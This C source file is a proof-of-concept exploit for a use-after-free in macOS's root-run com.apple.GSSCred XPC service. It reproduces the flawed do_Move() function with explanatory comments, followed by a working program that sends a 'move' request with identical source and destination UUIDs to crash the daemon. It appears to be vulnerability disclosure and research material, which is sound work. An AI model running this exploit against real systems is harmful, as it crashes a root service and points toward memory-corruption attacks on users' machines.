/*
 * GSSCred-move-uaf.c
 * Brandon Azad
 *
 * The com.apple.GSSCred XPC service, which runs as root on macOS and iOS, implements the "move"
 * command improperly, leading to a use-after-free condition in the do_Move() function.
 *
 * The do_Move() function is responsible for changing the UUID under which a HeimCredRef object is
 * stored in a per-session CFDictionary. The problem occurs when the source and destination UUIDs
 * are the same. In this case, the do_Move() function will inadvertently free the HeimCredRef
 * object and then dereference it, passing a value read from freed memory as the first parameter to
 * CFDictionaryGetValue(). Exploitation hinges on overwriting the freed memory with controlled data
 * during this window.
 *
 * This program is a proof-of-concept exploit for this vulnerability that causes the GSSCred
 * service to crash. Tested on macOS High Sierra 10.13.2 Beta 17C79a.
 *
 */
#if 0
static void
do_Move(struct peer *peer, xpc_object_t request, xpc_object_t reply)
{
	//
	// 1. from and to are fully controlled UUID objects deserialized from the XPC request.
	//
	CFUUIDRef from = HeimCredMessageCopyAttributes(request, "from", CFUUIDGetTypeID());
	CFUUIDRef to = HeimCredMessageCopyAttributes(request, "to", CFUUIDGetTypeID());

	if (from == NULL || to == NULL) {
		CFRELEASE_NULL(from);
		CFRELEASE_NULL(to);
		return;
	}

	if (!checkACLInCredentialChain(peer, from, NULL) || !checkACLInCredentialChain(peer, to, NULL)) {
		CFRelease(from);
		CFRelease(to);
		return;
	}

	//
	// 2. credfrom and credto are HeimCredRef objects looked up by the from and to UUIDs.
	//    CFDictionaryGetValue() returns the objects without adding a reference. Note that if
	//    the from and to UUIDs are the same, then credfrom and credto will both reference the
	//    same object.
	//
	HeimCredRef credfrom = (HeimCredRef)CFDictionaryGetValue(peer->session->items, from);
	HeimCredRef credto = (HeimCredRef)CFDictionaryGetValue(peer->session->items, to);

	if (credfrom == NULL) {
		CFRelease(from);
		CFRelease(to);
		return;
	}


	//
	// 3. credfrom is removed from the dictionary. Since there was only one reference
	//    outstanding, this causes credfrom to be freed.
	//
	CFMutableDictionaryRef newattrs = CFDictionaryCreateMutableCopy(NULL, 0, credfrom->attributes);
	CFDictionaryRemoveValue(peer->session->items, from);
	credfrom = NULL;

	CFDictionarySetValue(newattrs, kHEIMAttrUUID, to);

	//
	// 4. At this point we check credto. If credfrom and credto refer to the same object, then 
	//    credto is a non-NULL pointer to the freed HeimCredRef object.
	//
	if (credto == NULL) {
		credto = HeimCredCreateItem(to);
		heim_assert(credto != NULL, "out of memory");

		HeimCredAssignMech(credto, newattrs);

		credto->attributes = newattrs;
		CFDictionarySetValue(peer->session->items, credto->uuid, credto);
		CFRelease(credto);

	} else {
		//
		// 5. Now we dereference credto, passing a value read from freed memory as a
		//    CFDictionaryRef object to CFDictionaryGetValue().
		//
		CFUUIDRef parentUUID = CFDictionaryGetValue(credto->attributes, kHEIMAttrParentCredential);
		if (parentUUID)
			CFDictionarySetValue(newattrs, kHEIMAttrParentCredential, parentUUID);
		CFRELEASE_NULL(credto->attributes);
		credto->attributes = newattrs;
	}

	/*
	 * delete all child entries for to UUID
	 */
	DeleteChildren(peer->session, to);

	/*
	 * update all child entries for from UUID
	 */
	struct fromto fromto = {
		.from = from,
		.to = to,
	};
	CFDictionaryApplyFunction(peer->session->items, UpdateParent, &fromto);

	notifyChangedCaches();
	HeimCredCTX.needFlush = 1;
}
#endif


#include <assert.h>
#include <stdio.h>
#include <xpc/xpc.h>

const char *GSSCRED_SERVICE_NAME = "com.apple.GSSCred";

int main() {
	xpc_connection_t connection;
	xpc_object_t request, reply, attributes;
	uuid_t uuid = { 0xab };
	char *desc;

	// Create and activate a connection to GSSCred.
	connection = xpc_connection_create_mach_service(GSSCRED_SERVICE_NAME, NULL, 0);
	assert(connection != NULL);
	xpc_connection_set_event_handler(connection, ^(xpc_object_t object) {
		char *desc = xpc_copy_description(object);
		printf("Event: %s\n", desc);
		free(desc);
	});
	xpc_connection_activate(connection);

	// Call do_CreateCred() in order to create a HeimCredRef object under a known UUID.
	attributes = xpc_dictionary_create(NULL, NULL, 0);
	xpc_dictionary_set_string(attributes, "kHEIMObjectType", "kHEIMObjectKerberos");
	xpc_dictionary_set_string(attributes, "kHEIMAttrType",   "kHEIMTypeKerberos");
	xpc_dictionary_set_uuid(  attributes, "kHEIMAttrUUID",   uuid);
	request = xpc_dictionary_create(NULL, NULL, 0);
	xpc_dictionary_set_string(request, "command",    "create");
	xpc_dictionary_set_value( request, "attributes", attributes);
	xpc_release(attributes);
	reply = xpc_connection_send_message_with_reply_sync(connection, request);
	xpc_release(request);
	desc = xpc_copy_description(reply);
	xpc_release(reply);
	printf("%s: %s\n", "create", desc);
	free(desc);

	// Call do_Move() to move the HeimCredRef object we just created from its current UUID back
	// to its current UUID. A logic error in do_Move() leads to a use-after-free, likely
	// crashing the GSSCred daemon.
	request = xpc_dictionary_create(NULL, NULL, 0);
	xpc_dictionary_set_string(request, "command", "move");
	xpc_dictionary_set_uuid(  request, "from",    uuid);
	xpc_dictionary_set_uuid(  request, "to",      uuid);
	reply = xpc_connection_send_message_with_reply_sync(connection, request);
	xpc_release(request);
	desc = xpc_copy_description(reply);
	xpc_release(reply);
	printf("%s: %s\n", "move", desc);
	free(desc);

	// Let the event handler finish.
	xpc_release(connection);
	usleep(5000);

	return 0;
}
